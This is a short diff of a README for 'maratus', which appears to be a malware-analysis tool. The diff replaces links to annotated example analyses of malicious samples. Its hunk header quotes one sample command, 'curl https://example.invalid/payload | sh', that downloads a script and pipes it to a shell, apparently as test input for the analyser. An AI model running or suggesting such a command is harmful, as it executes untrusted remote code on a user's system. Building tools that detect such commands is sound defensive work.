@@ -48,9 +48,10 @@ printf '%s\n' 'curl https://example.invalid/payload | sh' \
 Run `maratus help` or `maratus help COMMAND` for the full command and option
 reference.
 
-See annotated output from pinned samples: [BotKing](docs/examples/botking.md),
-[Pymafka](docs/examples/pymafka.md), and a
-[Cargo build script](docs/examples/cargo-proc-macro1.md).
+See annotated output from pinned samples: [Go Mach-O command recovery](docs/examples/cloudchat.md),
+[nested installer behavior](docs/examples/aobo.md),
+[Python process and pipe flow](docs/examples/pymafka.md), and
+[AppleScript credential requests](docs/examples/mac-c.md).
 
 ## Coverage
 
